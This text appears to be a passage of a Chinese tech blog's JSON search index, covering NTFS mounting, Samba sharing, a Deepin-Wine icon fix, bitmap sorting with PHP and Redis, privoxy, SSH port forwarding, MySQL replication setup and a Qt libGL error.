需要注意的是，这里面有些分区是安装系统的时候自动挂载上去的。这里说一个小bug，如果你这个配置文件不对，每次开机的时候就会卡很久，大概30s左右。 因为这个配置文件是在开机的时候自动执行的，如果系统找不到你配置的磁盘或者挂载点，就会一直等，最后超时就会跳过。 所以如果你哪天发现你开机的时候很慢,不妨看看这个文件。 不过呢，手动配置还是比较麻烦，这里建议大家使用一个软件去配置挂载ntfs分区，名字叫 ntfs-config： 12sudo apt install ntfs-configsudo ntfs-config 会弹出一个图形界面，配置一下即可，简单方便，如果不是桌面版的话，你需要好好研究研究这个fstab文件的了，其实也不难，看看官方文档就可以了,这里不细说了！ 2.Samba共享这个其实挺实用的，很多路由器，nas都是用的这个共享文件，简单的说SMB是一种文件共享协议，Samba这个软件实现了这种协议，厉害的地方就在于SMB这个协议被Windows，Mac，Android等很多操作系统都支持。 你可以很方便的把你电脑上的文件通过网络(一般都是局域网)共享给别人。举个例子，在公司共享文件给同事，在家里可以共享一下电脑上的电影，照片啊，手机上装一个文件浏览器也可以。 个人经常用到的是把电脑下载好的电影共享出来，Android手机上安装一个叫作ES文件浏览器的App就可以直接“在线”看电影了。 1sudo apt install samba 打开一个文件夹的属性你就会看到共享的选项，可以选择只读或者读写，也可以设置访问账号和密码，如果只是自己用，全部都勾上就行了！ 就是这么简单，但是如果你不是用的桌面版Linux，那也没问题，Samba的配置文件位于 /etc/samba/smb.conf, 自己加一个配置就行，配置文件示例： 1234567[profiles] comment &#x3D; Users profiles path &#x3D; &#x2F;home&#x2F;samba&#x2F;profiles guest ok &#x3D; no browseable &#x3D; no create mask &#x3D; 0600 directory mask &#x3D; 0700 这里说一个疑难杂症，有可能有人遇到过，就是挂载的ntfs分区使用Samba共享的时候可能会出现共享权限问题，就是对方可以看到共享的文件夹，但是点击文件夹提示没有权限。排除了文件夹权限之后，我最后找到一个解决方案，就是在Samba的配置文件里面加入一个配置: force user = your-user-name","categories":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/tags/Linux/"},{"name":"Samba","slug":"Samba","permalink":"https://wangbjun.github.io/tags/Samba/"}]},{"title":"解决Deepin-Wine-QQ或微信图标Bug","slug":"deepin-wine-qq-bug","date":"2018-12-01T04:11:08.000Z","updated":"2020-01-08T17:40:29.008Z","comments":true,"path":"2018/12/01/deepin-wine-qq-bug/","link":"","permalink":"https://wangbjun.github.io/2018/12/01/deepin-wine-qq-bug/","excerpt":"之前写过一篇文章说在Linux下面使用deepin的wine QQ和微信, 虽然这个版本挺好用，但是一直以来有个bug困扰我：QQ和微信的图标都是wine的小图标，一模一样不说，还重叠在一起，当你使用 ctrl+tab 切换应用的时候很头疼，用过的人应该生有感受！","text":"之前写过一篇文章说在Linux下面使用deepin的wine QQ和微信, 虽然这个版本挺好用，但是一直以来有个bug困扰我：QQ和微信的图标都是wine的小图标，一模一样不说，还重叠在一起，当你使用 ctrl+tab 切换应用的时候很头疼，用过的人应该生有感受！ 有段时间我网上查了很久都没有找到答案，起初以为是图标问题！在Linux下面桌面图标快捷方式是由一个desktop文件配置，比如微信的内容基本上如下： 1234567891011121314#!/usr/bin/env xdg-open[Desktop Entry]Encoding=UTF-8Type=ApplicationX-Created-By=Deepin WINE TeamCategories=chat;Icon=deepin.com.wechatExec=\"/opt/deepinwine/apps/Deepin-WeChat/run.sh\" -u %uName=WeChatName[zh_CN]=微信Comment=Tencent WeChat Client on Deepin WineStartupWMClass=WeChat.exeMimeType= 其中有几个比较关键的地方，一个是Icon，一个是Exec，还有Name，有一天我看到这个 StartupWMClass 突发奇想，虽然我不懂是啥意思，但是感觉这个有问题。 于是百度了一下，基本上找不到任何内容，只有一篇文章，点进去居然是404…还好有百度快照！ 终于找到问题所在了，默认情况下，Linux是根据可执行文件的名称判定是属于哪个desktop文件配置的，大部分desktop文件的Exec配置的可执行文件刚好就是实际执行的文件名，所以很多没有StartupWMClass配置项。 但是这个配置项很重要，比如说在上面的微信的配置里面这个值是”WeChat.exe“，但是为什么还是不行呢？ 根据文章的说法，可以通过xprop WM_CLASS获取窗口的属性值，在命令行下执行这个命令，鼠标会变成+，然后点击要QQ或微信的窗口： 12jwang@jwang:~$ xprop WM_CLASSWM_CLASS(STRING) = \"wechat.exe\", \"Wine\" 不知道这个值是不是不同的电脑不一样，反正在我的电脑上面这个值是”wechat.exe“，居然是小写！ 这样的话，我们只需把desktop配置文件里面的StartupWMClass改成小写的就行了，问题解决！","categories":[{"name":"工具","slug":"工具","permalink":"https://wangbjun.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Deepin-Wine","slug":"Deepin-Wine","permalink":"https://wangbjun.github.io/tags/Deepin-Wine/"}]},{"title":"Bitmap原理和应用","slug":"bitmap","date":"2018-11-08T01:05:45.000Z","updated":"2020-01-08T09:49:09.403Z","comments":true,"path":"2018/11/08/bitmap/","link":"","permalink":"https://wangbjun.github.io/2018/11/08/bitmap/","excerpt":"问: “有10亿个不重复的无序的数字，如果快速排序？” 原理面试中经常会问到类似问题，看上去很简单，就是一个排序而已，但是你好好想想大部分排序算法都需要把数据放到内存里面操作，这10亿个数字得占用多少内存？好吧，你可以使用外部排序算法，在磁盘上完成排序！当然这些传统算法肯定是可以解决的，不过这里有一个更好的方案，采用bitmap排序，介绍如下： bitmap是什么？ 大家都知道在计算机中一个字节(byte) = 8位(bit), 这里的bit就是位，数据的最小表示单位，map一般是表示地图或者映射，加一起叫作位图？貌似不太形象","text":"问: “有10亿个不重复的无序的数字，如果快速排序？” 原理面试中经常会问到类似问题，看上去很简单，就是一个排序而已，但是你好好想想大部分排序算法都需要把数据放到内存里面操作，这10亿个数字得占用多少内存？好吧，你可以使用外部排序算法，在磁盘上完成排序！当然这些传统算法肯定是可以解决的，不过这里有一个更好的方案，采用bitmap排序，介绍如下： bitmap是什么？ 大家都知道在计算机中一个字节(byte) = 8位(bit), 这里的bit就是位，数据的最小表示单位，map一般是表示地图或者映射，加一起叫作位图？貌似不太形象 简单回顾一下二进制的一些知识： 1byte = 8bit 一个bit有2种状态，0 或者 1 所以1个byte可以表示0000 0000 -&gt; 1111 1111, 也就是十进制的 0 到 255 其中十进制和二进制对应关系如下： 12345678910111213141516171819 0 ---------&gt; 0000 0000 1 ---------&gt; 0000 0001 2 ---------&gt; 0000 0010 3 ---------&gt; 0000 0011 4 ---------&gt; 0000 0100 5 ---------&gt; 0000 0101 6 ---------&gt; 0000 0110 7 ---------&gt; 0000 0111 8 ---------&gt; 0000 1000 9 ---------&gt; 0000 100110 ---------&gt; 0000 101011 ---------&gt; 0000 101112 ---------&gt; 0000 110013 ---------&gt; 0000 110114 ---------&gt; 0000 111015 ---------&gt; 0000 1111..............................................255...........1111 1111 在大部分编程语言里面，int类型一般的都是占4个byte，也是32位，甭管你这个数字是1 或者是 21亿你都得占32位，所以如果你现在有10亿数字需要存放在内存里面，需要多少内存呢？ 1000000000 * 4 / 1024 / 1024 = 3800MB，大概需要3800MB内存，这里计算出的数值只适合C，在PHP里面，一个整型变量占用的实际空间远远大于4byte，是好几倍！ 为了解决这个问题，bitmap采用了一种映射机制，举个例子，假如有 1，3, 7，2, 5 这5个数字需要存放，正常情况下你需要5*4=20byte，但bitmap只需要1byte，它是咋做到呢？ 假设下面是1byte，首先将所有位置为0： 0 0 0 0 0 0 0 从第一个0开始数数，把对应数字的位置置为1，比如说第一个1那就是第2个位置置为1，第二个3就是把第4个位置置为1，依此论推… 123451 &#x3D;&gt; 0 1 0 0 0 0 0 03 &#x3D;&gt; 0 0 0 1 0 0 0 07 &#x3D;&gt; 0 0 0 0 0 0 0 12 &#x3D;&gt; 0 0 1 0 0 0 0 05 &#x3D;&gt; 0 0 0 0 0 1 0 0 叠加起来最终的串就是： 10 1 1 1 0 1 0 1 其实最终的数字和二进制没有什么关系，纯粹是数数，这个串就可以代表最大到7的数字，然后我们就开始数数，从0开始： 12345比如第1个位置是1，那就记个1比如第2个位置是1，那就记个2比如第3个位置是1，那就记个3比如第5个位置是1，那就记个5比如第7个位置是1，那就记个7 结果就是 1 2 3 5 7，不仅仅排序了，而且还去重了！如果按照这种转换机制，1个int类型，32位的话，可以表示0-31之间的数字！ 如果你们要表示最大1万的数，那就需要1万个位的串，但是编程语言并没有这样的数据类型，但是可以用数组去模拟 举个例子：一个整型是32位，也就说我们大概需要314个数组元素来表示这个串 数组第1个元素 00 - 31 数组第2个元素 32 - 63 数组第3个元素 64 - 95 数组第4个元素 96 - 127 …… 提到这个算法的好处，最大的好处就是节省内存，节省了好几十倍，适合处理大量数据，除了快速排序，还可以做快速去重，快速查询是否存在，还有一个比较好听的应用 Bloom Filter(布隆过滤器): Bloom Filter使用k个相互独立的哈希函数（Hash Function），它们分别将集合中的每个元素映射到{1,…,m}的范围中。对任意一个元素x，第i个哈希函数映射的位置hi(x)就会被置为1（1≤i≤k）。注：如果一个位置多次被置为1，那么只有第一次会起作用，后面几次将没有任何效果。Bloom Filter 在判断y是否属于这个集合时，对y应用k次哈希函数，若所有hi(y)的位置都是1（1≤i≤k），就认为y是集合中的元素，否则就认为y不是集合中的元素。 代码下面是这个算法的一些演示代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpnamespace App\\bitmap;class Bitmap&#123; const MAX &#x3D; 10000; const SHIFT &#x3D; 5; const MASK &#x3D; 0x1F; const DIGITS &#x3D; 32; private $bits &#x3D; []; public function __construct() &#123; $len &#x3D; 1 + self::MAX &#x2F; self::DIGITS; for ($i &#x3D; 0; $i &lt; $len; $i++) &#123; $this-&gt;bits[$i] &#x3D; 0; &#125; &#125; public function set(int $n) &#123; $this-&gt;bits[$n &gt;&gt; self::SHIFT] |&#x3D; (1 &lt;&lt; ($n &amp; self::MASK)); &#125; public function clear(int $n) &#123; $this-&gt;bits[$n &gt;&gt; self::SHIFT] &amp;&#x3D; (~(1 &lt;&lt; ($n &amp; self::MASK))); &#125; public function test(int $n) &#123; return $this-&gt;bits[$n &gt;&gt; self::SHIFT] &amp; (1 &lt;&lt; ($n &amp; self::MASK)); &#125;&#125;$bitmap &#x3D; new Bitmap();for ($i &#x3D; 0; $i &lt; Bitmap::MAX; $i++) &#123; $bitmap-&gt;clear($i);&#125;$exampleData &#x3D; [1, 23, 34, 5454, 677, 834, 123, 355, 6784, 2345, 98, 9782, 432, 2342, 872, 732, 2334];foreach ($exampleData as $item) &#123; $bitmap-&gt;set($item);&#125;for ($i &#x3D; 1; $i &lt;&#x3D; Bitmap::MAX; $i++) &#123; if ($bitmap-&gt;test($i)) &#123; printf(&quot;%d &quot;, $i); &#125;&#125; 由于这里面涉及很多位运算操作，所以先回顾一下位操作： 此算法的实现是参考一个C语言版本的，简单解析一下： 第一步，是初始化一个数组，这个数组的长度是根据最大的元素的值来的，比如说你要存一个最大10000的数，由于每个元素最多32位，所以需要大概314个数组。 第二步，初始化数组中的每个元素，把每个位都置成0，在PHP里面其实不需要，但是C里面是必须的，使用了clear这个函数。 SHIFT 是表示位移的位数，之所以是5是因为2的5次方是32，简单的说 $n &gt;&gt; self::SHIFT 这个操作是为了找到当前元素在哪个数组！ MASK 是表示掩码，0x1F是 十进制的31，1 &lt;&lt; ($n &amp; self::MASK) 这个操作是计算出当前元素在对应数组里面位置！ 举个例子，当前元素是100，按照算法，是在第3个数组里面，下标为4的位置，大家仔细推敲一下，结果确实是这样！只不过这里运用了不少位操作，所以理解起来可能会麻烦一点。 REDIS bitmap相关应用自己造轮子太累，redis提供了类似的命令，最大可以存放2的32次方，即21亿多的数字，主要有以下几个：SETBIT， GETBIT， BITCOUNT， BITOP， BITPOS，BITFIELD， 主要用来做活跃用户在线状态、活跃用户统计、用户签到等场景，特别适合大量用户，几千万上亿级别，当然你用传统数据库也能做，但是redis做起来更简单，更节省空间！ 下面举一个用户签到的功能设计案例： 很多App都有一个签到功能，比如说连续签到7天或者30天给一些奖励，需求十分简单！ 作为后端，我们需要提供一个签到接口，然后记录用户签到的信息，比如用户uid，签到时间！ 如果使用传统关系型数据库，我们可能需要建一张签到表，大概有id、uid、createdTime等几个字段，当用户签到的时候新增一条记录就行！这种做法肯定是没问题的，但是如果网站每天有千万用户签到，那么这张表每天都会有千万条记录产生，数据的存储是问题！分库分表必不可少！ 假如使用redis的bit操作，我们可以使用setbit，SETBIT key offset value 对指定的key的value的指定偏移(offset)的位置1或0, 其中key我们可以设置为当天的年月日，offset是用户uid（这里暂时只考虑uid是纯数字的情况）,value的话1表示已签到。比如说用户uid位12500的用户在20190501签到了，我们可以执行SETBIT 20190501 12500 1,其它用户依此论推！ 如果我们需要查询用户某天是否签到，只需要使用GETBIT 20190501 12500，返回1表示已签到，0未签到。 如果需要查询某天有多少人签到，可以使用BITCOUNT 20190501。 如果要统计连续7天签到的总人数的话可以使用bitop命令，比如bitop AND 7_dasy_sign 20190501 20190502 20190503 ... 20190507。 理论上讲，setbit的大小在0到2的32次方（最大使用512M内存）之间，即0~4294967296之间，也就说最多可以存储42亿用户的签到情况。和数据库相比，这种方式查询的效率非常高，并不会因为数据大而变慢，而且比较节省内存，操作上也不是太复杂！","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Bitmap","slug":"Bitmap","permalink":"https://wangbjun.github.io/tags/Bitmap/"}]},{"title":"科学上网之socks代理转http(s)","slug":"socks-to-http","date":"2018-11-03T11:02:46.000Z","updated":"2020-01-08T09:49:09.419Z","comments":true,"path":"2018/11/03/socks-to-http/","link":"","permalink":"https://wangbjun.github.io/2018/11/03/socks-to-http/","excerpt":"从事IT开发行业的总免不了用用Google，看看国外互联网，但是呢有道墙大家都懂的，其中有一种socks5的梯子，一般都是配置浏览器，如何在命令行下也使用呢？有过使用经验的都知道，Linux终端是不走socks代理配置的，除此之外，很多软件或者应用也不支持socks代理设置，但是有一个软件是可以把socks代理转为http代理，这个软件就叫做privoxy，下面简单介绍下这个软件使用：","text":"从事IT开发行业的总免不了用用Google，看看国外互联网，但是呢有道墙大家都懂的，其中有一种socks5的梯子，一般都是配置浏览器，如何在命令行下也使用呢？有过使用经验的都知道，Linux终端是不走socks代理配置的，除此之外，很多软件或者应用也不支持socks代理设置，但是有一个软件是可以把socks代理转为http代理，这个软件就叫做privoxy，下面简单介绍下这个软件使用： 1.开启某SS代理，代理地址假设为 127.0.0.1:1080 2.安装privoxy，这里只介绍debian系列发行版，其他系统不多说，其实都差不多 1sudo apt-get install privoxy 3.修改privoxy配置 1sudo vim &#x2F;etc&#x2F;privoxy&#x2F;config 在里面添加一条： 1forward-socks5 &#x2F; 127.0.0.1:1080 . 请注意后面有一个 . 123456# 下面还存在以下一条配置，表示privoxy监听本机8118端口# 把它作为http代理，代理地址为 http:&#x2F;&#x2F;localhost.8118&#x2F; # 可以把地址改为 0.0.0.0:8118，表示外网也可以通过本机IP作http代理# 这样，你的外网IP为1.2.3.4，别人就可以设置 http:&#x2F;&#x2F;1.2.3.4:8118&#x2F; 为http代理listen-address localhost:8118 4.重启privoxy服务 1sudo service prioxy restart 5.配置命令行或者应用 如果是软件，直接在软件代理设置填写http(s)地址为 127.0.0.1:8118 即可 如果是Linux命令行可以使用export命令临时设置代理，命令如下： 12export http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:8118&#x2F;export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:8118&#x2F; 如果需要永久设置代理，可以修改环境配置文件，把上面的命令写到.bashrc文件里面就行了，但是不建议这么做，这样所有流量都会走代理，会影响访问国内网站的速度，建议需要的时候临时配置即可，毕竟这样的场景并不多！","categories":[{"name":"工具","slug":"工具","permalink":"https://wangbjun.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Socks","slug":"Socks","permalink":"https://wangbjun.github.io/tags/Socks/"}]},{"title":"内网穿透之SSH端口转发","slug":"ssh-port-redirect","date":"2018-10-03T04:29:06.000Z","updated":"2020-01-08T17:42:36.775Z","comments":true,"path":"2018/10/03/ssh-port-redirect/","link":"","permalink":"https://wangbjun.github.io/2018/10/03/ssh-port-redirect/","excerpt":"1.场景需求：有些公司喜欢把svn或者git，或者是内部测试服务器放在公司，一般来说，由于NAT的原因，这种访问是单向的，举个例子，我们可以访问百度的服务器，但是百度服务器是没法访问我们电脑的。 由于只能通过公司内网访问，员工回家之后就无法访问了，安全是安全了，但是万一有个需求需要从公司外部访问呢？ 对路由器比较熟悉的童鞋会说：“在路由器上作端口映射转发即可”。这个方案确实可以，但是有2个问题，首先，你得能控制路由器并且可以在上面做设置。其次，一般公司的宽带都没有固定ip，这意味着这个公网ip每隔10-20小时就会变动…","text":"1.场景需求：有些公司喜欢把svn或者git，或者是内部测试服务器放在公司，一般来说，由于NAT的原因，这种访问是单向的，举个例子，我们可以访问百度的服务器，但是百度服务器是没法访问我们电脑的。 由于只能通过公司内网访问，员工回家之后就无法访问了，安全是安全了，但是万一有个需求需要从公司外部访问呢？ 对路由器比较熟悉的童鞋会说：“在路由器上作端口映射转发即可”。这个方案确实可以，但是有2个问题，首先，你得能控制路由器并且可以在上面做设置。其次，一般公司的宽带都没有固定ip，这意味着这个公网ip每隔10-20小时就会变动… 2.场景假设： 公司内部有一台服务器1，ip地址为: 192.168.1.125，只有公司内部同一网段的设备才能访问 公司外面有一台公网ip的服务器2，ip地址为: 45.32.127.32，所有人都可以访问 假如我们需要公司外部的人也能访问服务器1需要怎么做呢？解决方案就是采用SSH端口转发，命令如下： 1ssh -fNR 8000:localhost:80 root@45.32.127.32 还有一点非常重要，你需要在45.32.127.32这台服务器开启ssh一个配置（linux系统里面一般是在/etc/ssh/sshd_config文件）： 1GatewayPorts yes 这段命令的意思是把对服务器2的8000端口请求转发到服务器1的80端口，这样我们访问 http://45.32.127.32:8000 就相当于访问 http://192.168.1.125:80 当然你还可以转发其他端口，比如常见的3306, 22, 21等端口。 3.总结：上面所说的这种方式又被称为SSH端口远程转发,具体的命令细节这里不作过多解读，与之对应的还有一种方式称为本地转发,其命令如下： 1ssh -fNL 8000:45.32.127.32:80 root@192.168.1.125 这段命令的意思是把对本地8000端口的请求转发到45.32.127.32的80端口上面去，这时候访问 http://127.0.0.1:8000 就相当于访问 http://45.32.127.32:80。 举个例子，你们公司有2台服务器，它们之间可以互联，其中有一台服务器可以上网，但是另一台呢被防火墙挡着了，这时候通过这个命令就可以“翻墙”了。 还有一种方式叫作动态转发，命令如下： 1ssh -D 50000 root@45.32.127.32。 这种方式其实就是相当于socks代理，他会把本地的所有请求都转发到远程服务器上面，很实用哦，假如说你的那台服务器是在国外的话，你懂的！ 最后，有一点需要说明的是，所有的流量都会走中间服务器过，这种端口转发其实就是一种代理，类似于VPN。 其实利用SSH转发我们可以把放在家里的服务器开放给朋友，不过家庭宽带上传速度有限，不拿来商用还是可以滴，商用还是买个正规云服务器靠谱！还有，这种方式一般都是临时用一下，如果想长期使用，可以尝试一下frp等类似的软件！","categories":[{"name":"工具","slug":"工具","permalink":"https://wangbjun.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"SSH","slug":"SSH","permalink":"https://wangbjun.github.io/tags/SSH/"}]},{"title":"Mysql主从复制实践","slug":"mysql-master-slave-copy","date":"2018-09-05T11:10:03.000Z","updated":"2020-01-08T10:29:38.213Z","comments":true,"path":"2018/09/05/mysql-master-slave-copy/","link":"","permalink":"https://wangbjun.github.io/2018/09/05/mysql-master-slave-copy/","excerpt":"1.安装很多人都知道可以用apt或者yum安装，但是实际生产环境很少采用这种方式安装，有些会采用源码编译(据说性能高？)，有些会从官网下载编译好的二进制安装包！ 为什么不直接用命令安装呢？因为命令安装的位置不同发行版不一样，而且其配置文件存放的位置又各有差异，现实中大部分公司都有一个约定的规则，比如说所有的安装都安装在 /data 目录下，如果需要开机自启，需自行编写脚本，不依赖系统服务。 还有一个重要的原因是因为很多时候数据库是安装在单独的数据库服务器，但是一台电脑比如说32核64G内存这样的配置，是需要安装多个Mysql实例的，用不同的端口区分，这些库可能是不同的项目所用到。","text":"1.安装很多人都知道可以用apt或者yum安装，但是实际生产环境很少采用这种方式安装，有些会采用源码编译(据说性能高？)，有些会从官网下载编译好的二进制安装包！ 为什么不直接用命令安装呢？因为命令安装的位置不同发行版不一样，而且其配置文件存放的位置又各有差异，现实中大部分公司都有一个约定的规则，比如说所有的安装都安装在 /data 目录下，如果需要开机自启，需自行编写脚本，不依赖系统服务。 还有一个重要的原因是因为很多时候数据库是安装在单独的数据库服务器，但是一台电脑比如说32核64G内存这样的配置，是需要安装多个Mysql实例的，用不同的端口区分，这些库可能是不同的项目所用到。 下面我就介绍如何使用编译好的二进制安装包安装MySQL: 1.首先下载MySQL安装包，地址：https://dev.mysql.com/downloads/mysql/ 选择符合自己需要的下载 这里以8.0.12版本为例，下载tar压缩包后解压，其目录结构如下： 123456789drwxrwxr-x 2 jwang jwang 4096 Sep 28 15:38 bindrwxrwxr-x 2 jwang jwang 4096 Sep 28 15:38 docsdrwxrwxr-x 3 jwang jwang 4096 Sep 28 15:37 includedrwxrwxr-x 5 jwang jwang 4096 Sep 28 15:38 lib-rw-r--r-- 1 jwang jwang 301518 Jun 29 00:18 LICENSEdrwxrwxr-x 4 jwang jwang 4096 Sep 28 15:37 man-rw-r--r-- 1 jwang jwang 687 Jun 29 00:18 READMEdrwxrwxr-x 28 jwang jwang 4096 Sep 28 15:38 sharedrwxrwxr-x 2 jwang jwang 4096 Sep 28 15:38 support-files 其中bin目录存放的就是各种可执行文件 假设现在解压后的文件夹名字叫mysql8，位于 /data 目录下 先做准备一些工作, 创建mysql用户，分配权限 123groupadd mysqluseradd -r -g mysql -s &#x2F;bin&#x2F;false mysqlchown mysql:mysql mysql8 接下来有一个非常重要的操作，就是初始化MySQL 1&#x2F;data&#x2F;mysql8&#x2F;bin&#x2F;mysqld --initialize --user&#x3D;mysql 默认情况下, 上面这个操作会在一些目录创建一些文件，然而实际操作中，我们一般会指定一些配置参数,创建一个文件 /data/3306/my.cnf, 这里有一个配置文件供大家参考: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283[mysqld]server_id &#x3D; 1100user &#x3D; mysqlport &#x3D; 3306datadir &#x3D; &#x2F;data&#x2F;3306&#x2F;databasedir &#x3D; &#x2F;data&#x2F;mysql8log-bin &#x3D; &#x2F;data&#x2F;3306&#x2F;data&#x2F;binlogsocket &#x3D; &#x2F;data&#x2F;3306&#x2F;tmp&#x2F;mysql.sockpid-file &#x3D; &#x2F;data&#x2F;3306&#x2F;mysql.pidlog-error &#x3D; &#x2F;data&#x2F;3306&#x2F;log&#x2F;mysql_error.logrelay-log &#x3D; &#x2F;data&#x2F;3306&#x2F;relaylogrelay-log-index &#x3D; &#x2F;data&#x2F;3306&#x2F;relaylog.indexdefault-storage-engine &#x3D; Innodbsql-mode&#x3D;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES#慢查询long_query_time &#x3D; 1slow-query-log &#x3D; onslow_query_log_file &#x3D; &#x2F;data&#x2F;mysqld&#x2F;3306&#x2F;log&#x2F;mysql_slow.log#记录更多的日志log_slow_admin_statements#master&#x2F;slaveslave_skip_errors&#x3D;1032,1062log-slave-updatesmaster-info-repository&#x3D;TABLEreport_host&#x3D;192.168.1.100report_port&#x3D;3306enforce_gtid_consistencygtid-mode&#x3D;ON#charsetcharacter-set-server &#x3D; utf8#log_warnings &#x3D; 0open_files_limit &#x3D; 10240#参考:短时间内最大连接back_log &#x3D; 1024#binlogbinlog_cache_size &#x3D; 4Mbinlog_format &#x3D; MIXEDmax_binlog_cache_size &#x3D; 8Mmax_binlog_size &#x3D; 1Gexpire_logs_days &#x3D; 2#cachequery_cache_type &#x3D; 1query_cache_limit &#x3D; 2Mquery_cache_size &#x3D; 64M#bufferjoin_buffer_size &#x3D; 32Msort_buffer_size &#x3D; 32M#???read_rnd_buffer_size &#x3D; 16M#innodb Dynamic&#x3D;NOinnodb_read_io_threads &#x3D; 8innodb_write_io_threads &#x3D; 4 innodb_buffer_pool_size &#x3D; 10240M #数据刷新方式innodb_flush_method &#x3D; O_DIRECT#单个连接所分配的内存大小innodb_sort_buffer_size &#x3D; 4M#只限slave配置innodb_flush_log_at_trx_commit &#x3D; 0#threadthread_cache_size &#x3D; 256#connectionsmax_connections &#x3D; 2048 max_connect_errors &#x3D; 10240init-connect&#x3D;&#39;SET NAMES utf8&#39;#跳过反向解析skip-name-resolve &#x3D; 1explicit_defaults_for_timestamp &#x3D; TRUE#调用group_catgroup_concat_max_len &#x3D; 204800 具体的配置项这么不细说了，有些可能需要根据你服务器的配置做一些调整！然后执行下面的命令初始化： 1&#x2F;data&#x2F;mysql8&#x2F;bin&#x2F;mysqld --defaults-file&#x3D;&#x2F;data&#x2F;3306&#x2F;my.cnf --initialize --explicit_defaults_for_timestamp --user&#x3D;mysql 如果没有报错，你应该可以在 /data/3306 目录里面看到一些生成的文件，请注意这时候在 /data/3306/log/mysql_error.log 文件里面会有一个生成的临时密码,类似这样的语句： A temporary password is generated for root@localhost: h9iec,Z,Hel1 然后使用下面语句启动MySQL 1&#x2F;data&#x2F;mysql8&#x2F;bin&#x2F;mysqld_safe --defaults-file&#x3D;&#x2F;data&#x2F;3306&#x2F;my.cnf --ledir&#x3D;&#x2F;data&#x2F;mysql8&#x2F;bin&#x2F; &amp; 如果没有报错，你可以使用ps查看一下进程，应该是启动了！ 可以使用以下命令连接MySQL： 1&#x2F;data&#x2F;mysql8&#x2F;bin&#x2F;mysql -S &#x2F;data&#x2F;3306&#x2F;mysql.sock -uroot -p 修改密码： 12set password&#x3D;password(&#39;yourpass&#39;);flush privileges; 这里需要注意的是 server_id 不能重复，建议以ip最后2位为参考，假设这里主服务器ip为192.168.1.100，从服务器ip为192.168.1.105 2.配置主从看到这里说明这两台Mysql服务器已经跑起来了，接下来就是配置主从关系 首先，得在主服务器MySQL里面新建一个账号专门用于同步： 12create user &#39;repl&#39;@&#39;192.168.%&#39; identified by &#39;repl_pass&#39;;grant select,replication slave, REPLICATION CLIENT on *.* to &#39;repl&#39;@&#39;192.168.%&#39;; 为了安全考虑，可以限定其ip范围，并且只授予给定权限，当然你也可以用root账号，只要有权限，应该都没问题 如果你的主服务器已经有数据的话，有2种选项，一种是不做处理，建立主从关系之后让MySQL自动同步，但是如果数据量大的话可能比较慢，另一种，在主库上面备份数据，导入从服务器，这里有一个备份命令可以参考： 1&#x2F;data&#x2F;mysql8&#x2F;bin&#x2F;mysqldump --skip-lock-tables --single-transaction --flush-logs --hex-blob --master-data&#x3D;2 --databases yourdatabases -S&#x2F;data&#x2F;3306&#x2F;mysql.sock -uroot -pyourpass --result-file&#x3D;&#x2F;data&#x2F;backup.sql 如果你的数据真的非常大，建议在导入从库的时候在备份的文件里面加入一行配置暂时关闭binlog： 1sed -i &quot;1iset sql_log_bin&#x3D;off;\\n&quot; &#x2F;data&#x2F;backup.sql 一切搞定之后，只剩下最后一步了，设置主从关系： 12345678stop slave;CHANGE MASTER TO MASTER_HOST&#x3D;&#39;192.168.1.100&#39;, MASTER_PORT&#x3D;3306,MASTER_USER&#x3D;&#39;repl&#39;, MASTER_PASSWORD&#x3D;&#39;repl_pass&#39;, #MASTER_LOG_FILE&#x3D;&#39;binlog.004335&#39;, #MASTER_LOG_POS&#x3D;120; start slave; 注意，如果你是导入主库的数据话，你会发现在备份的文件前面有一行是这样的： 1CHANGE MASTER TO MASTER_LOG_FILE&#x3D;&#39;binlog.004335&#39;, MASTER_LOG_POS&#x3D;120; 这就是注释里面需要的binlog文件和其位置，全新的库的话就不需要 最后，show slave status\\G 查看一下从库的状态","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://wangbjun.github.io/tags/MySQL/"},{"name":"数据库","slug":"数据库","permalink":"https://wangbjun.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"Qt-运行-cant't-find-lGL","slug":"qt-can-not-find-igl","date":"2018-09-03T05:22:00.000Z","updated":"2020-01-08T17:44:37.443Z","comments":true,"path":"2018/09/03/qt-can-not-find-igl/","link":"","permalink":"https://wangbjun.github.io/2018/09/03/qt-can-not-find-igl/","excerpt":"实验问题：运行最简单”hello world!”,出现can’t find -lGL的问题 实验阵地： ubuntu14.04+qt5.2 问题分析：出现该类问题的原因有2个： (1)没有安装libGL; (2)libGL没有正确链接。","text":"实验问题：运行最简单”hello world!”,出现can’t find -lGL的问题 实验阵地： ubuntu14.04+qt5.2 问题分析：出现该类问题的原因有2个： (1)没有安装libGL; (2)libGL没有正确链接。 问题解答： （1）如果是问题1,这个好办。只要安装libGL即可。这个在其他博客中也都有提到, 如http://blog.sina.com.cn/s/blog_500bd63c0102uzmt.html只需终端执行 12$ sudo apt-get install build-essential $ sudo apt-get install libgl1-mesa-dev 安装libGL即可。（libGL是openGL的库） （2）如果是问题2,就稍微难办一点。首先，我们利用命令 1$ &#x2F;sbin&#x2F;ldconfig -v | grep GL 查看所有有关GL的链接库的链接关系。如果是问题2，则会有这样的打印信息 1&#x2F;sbin&#x2F;ldconfig.real: Cannot stat &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;mesa&#x2F;libGL.so: No such file or directory 表示”无法获取libGL的链接信息：没有该文件或目录”。我们进入/usr/lib/x86_64-linux-gnu/mesa/ 1$ cd &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;mesa&#x2F; 